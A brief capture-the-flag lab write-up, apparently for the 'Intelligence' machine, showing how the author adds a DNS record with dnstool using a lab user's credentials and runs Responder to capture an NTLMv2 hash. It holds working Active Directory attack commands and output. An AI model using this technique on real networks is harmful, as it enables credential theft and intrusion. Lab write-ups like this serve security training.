# Intelligence - DNS record / dnstool

A script checks DNS records starting with `web*` and if the server returns non-200, sends "Host: $(record.Name) is down" mail to Ted Gravis.

Using dnstool to modify the record and Responder to capture NTLMv2 hash:

```bash
dnstool -u intelligence\\tiffany.molina -p NewIntelligenceCorpUser9876 --action add --record web-zetr0 --data 10.10.14.28 10.10.10.248
```

```bash
dnstool -u intelligence\\tiffany.molina -p NewIntelligenceCorpUser9876 --action query --record web-zetr0 --data 10.10.14.28 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record web-zetr0
DC=web-zetr0,DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb
[+] Record entry:
 - Type: 1 (A) (Serial: 70)
 - Address: 10.10.14.28
```

```bash
responder -I tun0
```

[image]
